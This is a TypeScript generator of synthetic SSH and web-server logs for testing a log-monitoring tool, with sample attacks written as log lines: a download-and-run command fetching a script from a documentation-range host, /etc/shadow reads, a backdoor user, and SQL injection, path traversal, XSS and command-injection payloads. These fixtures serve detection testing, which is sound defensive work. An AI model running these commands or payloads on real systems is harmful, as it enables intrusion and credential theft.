/**
 * Genera logs sintéticos realistas en samples/ para probar LogSentinel.
 * Todas las IPs públicas son de los rangos reservados para documentación (RFC 5737:
 * 192.0.2.0/24, 198.51.100.0/24 y 203.0.113.0/24), así que no apuntan a nadie real.
 * El generador usa una semilla fija: siempre produce exactamente los mismos ficheros.
 */
import { mkdirSync, writeFileSync } from 'node:fs';

let seed = 1337;
function random(): number {
    // mulberry32: PRNG pequeño y determinista
    seed = (seed + 0x6d2b79f5) | 0;
    let t = Math.imul(seed ^ (seed >>> 15), 1 | seed);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
}
const pick = <T>(list: T[]): T => list[Math.floor(random() * list.length)];
const between = (min: number, max: number) => min + Math.floor(random() * (max - min + 1));

const MONTHS = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
const pad = (n: number) => String(n).padStart(2, '0');
const DAY_START = new Date(2026, 9, 27, 0, 0, 0).getTime(); // 27 oct 2026, 00:00 hora local

function syslogDate(ms: number): string {
    const d = new Date(ms);
    return `${MONTHS[d.getMonth()]} ${String(d.getDate()).padStart(2, ' ')} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
}

function clfDate(ms: number): string {
    const d = new Date(ms);
    const offset = -d.getTimezoneOffset();
    const zone = `${offset >= 0 ? '+' : '-'}${pad(Math.floor(Math.abs(offset) / 60))}${pad(Math.abs(offset) % 60)}`;
    return `${pad(d.getDate())}/${MONTHS[d.getMonth()]}/${d.getFullYear()}:${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())} ${zone}`;
}

const at = (h: number, m: number, s = 0) => DAY_START + ((h * 60 + m) * 60 + s) * 1000;

// ---------------------------------------------------------------- auth.log
type Line = { ms: number; text: string };
const auth: Line[] = [];
let pid = 2100;

function sshd(ms: number, message: string) {
    auth.push({ ms, text: `${syslogDate(ms)} web01 sshd[${pid++}]: ${message}` });
}
function sudo(ms: number, user: string, command: string) {
    auth.push({ ms, text: `${syslogDate(ms)} web01 sudo:   ${user} : TTY=pts/0 ; PWD=/home/${user} ; USER=root ; COMMAND=${command}` });
}

// Actividad normal del equipo durante el día
for (let i = 0; i < 40; i++) {
    const ms = at(between(8, 19), between(0, 59), between(0, 59));
    const [user, ip, method] = pick([
        ['alice', '10.0.0.15', 'publickey'],
        ['bob', '10.0.0.22', 'password'],
        ['carlos', '10.0.0.31', 'publickey'],
    ]);
    if (method === 'password' && random() < 0.3) {
        sshd(ms - 4000, `Failed password for ${user} from ${ip} port ${between(40000, 65000)} ssh2`);
    }
    sshd(ms, `Accepted ${method} for ${user} from ${ip} port ${between(40000, 65000)} ssh2`);
}
sudo(at(9, 12), 'alice', '/usr/bin/systemctl restart nginx');
sudo(at(11, 40), 'carlos', '/usr/bin/apt update');
sudo(at(16, 5), 'alice', '/usr/bin/journalctl -u nginx');

// Login directo como root desde la red interna (mala práctica)
sshd(at(7, 55, 10), `Accepted password for root from 10.0.0.9 port 51022 ssh2`);

// Ataque 1: fuerza bruta masiva contra root/admin
for (let i = 0; i < 160; i++) {
    const user = i % 4 === 0 ? 'admin' : 'root';
    const invalid = user === 'admin' ? 'invalid user ' : '';
    sshd(at(2, 10) + i * 2300, `Failed password for ${invalid}${user} from 203.0.113.45 port ${between(30000, 60000)} ssh2`);
}

// Ataque 2: password spraying, una o dos contraseñas contra muchos usuarios
const sprayUsers = ['test', 'oracle', 'postgres', 'ubuntu', 'git', 'jenkins', 'pi', 'guest', 'ftpuser', 'support', 'deploy', 'www'];
sprayUsers.forEach((user, i) => {
    const ms = at(3, 30) + i * 25_000;
    if (user === 'deploy') {
        sshd(ms, `Failed password for deploy from 198.51.100.23 port ${between(30000, 60000)} ssh2`);
    } else {
        sshd(ms, `Invalid user ${user} from 198.51.100.23 port ${between(30000, 60000)}`);
        sshd(ms + 1500, `Failed password for invalid user ${user} from 198.51.100.23 port ${between(30000, 60000)} ssh2`);
    }
});

// Ataque 3: fuerza bruta lenta contra "deploy" que acaba entrando, seguida de post-explotación
for (let i = 0; i < 18; i++) {
    sshd(at(4, 0) + i * 40_000, `Failed password for deploy from 192.0.2.77 port ${between(30000, 60000)} ssh2`);
}
sshd(at(4, 12, 30), 'Accepted password for deploy from 192.0.2.77 port 55102 ssh2');
sudo(at(4, 14), 'deploy', '/usr/bin/cat /etc/shadow');
sudo(at(4, 15), 'deploy', '/usr/sbin/useradd -m -s /bin/bash sysupdate');
sudo(at(4, 16), 'deploy', '/bin/sh -c curl -s http://198.51.100.99/u.sh | bash');
sudo(at(4, 18), 'deploy', '/usr/bin/history -c');

auth.sort((a, b) => a.ms - b.ms);

// ---------------------------------------------------------------- access.log
const web: Line[] = [];
const BROWSERS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
    'Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0',
];

function request(ms: number, ip: string, method: string, path: string, status: number, bytes: number, ua: string, referrer = '-') {
    web.push({ ms, text: `${ip} - - [${clfDate(ms)}] "${method} ${path} HTTP/1.1" ${status} ${bytes} "${referrer}" "${ua}"` });
}

// Tráfico legítimo
const PAGES = ['/', '/productos', '/productos?id=12', '/productos?id=7', '/contacto', '/blog/seguridad-basica', '/css/main.css', '/js/app.js', '/img/logo.svg'];
for (let i = 0; i < 400; i++) {
    const ms = at(between(7, 23), between(0, 59), between(0, 59));
    const ip = `203.0.113.${between(10, 40)}`;
    const path = pick(PAGES);
    request(ms, ip, 'GET', path, 200, between(800, 48000), pick(BROWSERS), path === '/' ? '-' : 'https://tienda.example.com/');
}
for (let i = 0; i < 12; i++) {
    request(at(between(8, 22), between(0, 59)), `203.0.113.${between(10, 40)}`, 'GET', '/favicon.ico', 404, 153, pick(BROWSERS));
}
request(at(12, 30), '203.0.113.18', 'POST', '/contacto', 302, 0, BROWSERS[0], 'https://tienda.example.com/contacto');

// Escáner Nikto + fuzzing de rutas desde 198.51.100.200
const WORDLIST = ['admin', 'administrator', 'login', 'wp-admin', 'wp-login.php', 'old', 'test', 'dev', 'staging', 'api', 'api/v1', 'console', 'manager/html',
    'cgi-bin/', 'backup', 'backups', 'db', 'uploads', 'private', 'config', 'conf', 'install', 'setup.php', 'info.php', 'phpinfo.php', 'shell.php',
    'cmd.php', 'upload.php', 'temp', 'tmp', 'logs', 'log', 'debug', 'portal', 'panel', 'cpanel', 'webadmin', 'adminer.php', 'server-info', 'readme.html'];
WORDLIST.forEach((word, i) => {
    request(at(13, 2) + i * 3000, '198.51.100.200', 'GET', `/${word}`, 404, 162, 'Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:007153)');
});
[['/.env', 404], ['/.git/config', 404], ['/backup.sql', 404], ['/phpmyadmin/', 404], ['/server-status', 403]].forEach(([path, status], i) => {
    request(at(13, 5) + i * 2000, '198.51.100.200', 'GET', path as string, status as number, 162, 'Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:003584)');
});

// Inyección SQL con sqlmap: una de las peticiones devuelve 200 con más datos de lo normal
const SQLMAP = 'sqlmap/1.8.4#stable (https://sqlmap.org)';
const sqli = [
    ["/productos?id=12'", 500, 1200],
    ["/productos?id=12%27%20OR%20%271%27%3D%271", 200, 98000],
    ['/productos?id=12%20UNION%20ALL%20SELECT%20NULL%2CNULL%2Cversion()--%20-', 500, 1200],
    ['/productos?id=12%20AND%20SLEEP(5)', 200, 15800],
    ['/productos?id=12%3B%20DROP%20TABLE%20users--', 500, 1200],
    ['/productos?id=-1%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables', 500, 1200],
];
sqli.forEach(([path, status, bytes], i) => {
    request(at(14, 20) + i * 4000, '203.0.113.99', 'GET', path as string, status as number, bytes as number, SQLMAP);
});

// Path traversal, también con doble codificación
[
    ['/descargas?file=../../../../etc/passwd', 400],
    ['/descargas?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd', 404],
    ['/descargas?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd', 403],
    ['/descargas?file=php://filter/convert.base64-encode/resource=index.php', 400],
].forEach(([path, status], i) => {
    request(at(15, 45) + i * 6000, '192.0.2.150', 'GET', path as string, status as number, 320, BROWSERS[3]);
});

// XSS reflejado en el buscador
request(at(17, 3), '198.51.100.61', 'GET', '/buscar?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E', 200, 5400, BROWSERS[1]);
request(at(17, 4), '198.51.100.61', 'GET', '/buscar?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E', 200, 5390, BROWSERS[1]);

// Inyección de comandos en una herramienta de diagnóstico
request(at(18, 30), '203.0.113.140', 'GET', '/tools/ping?host=127.0.0.1%3Bcat%20%2Fetc%2Fpasswd', 500, 230, 'curl/8.5.0');
request(at(18, 31), '203.0.113.140', 'GET', '/tools/ping?host=127.0.0.1%7Cwhoami', 500, 230, 'curl/8.5.0');

web.sort((a, b) => a.ms - b.ms);

mkdirSync('samples', { recursive: true });
writeFileSync('samples/auth.log', auth.map((l) => l.text).join('\n') + '\n');
writeFileSync('samples/access.log', web.map((l) => l.text).join('\n') + '\n');
console.log(`samples/auth.log   ${auth.length} líneas`);
console.log(`samples/access.log ${web.length} líneas`);
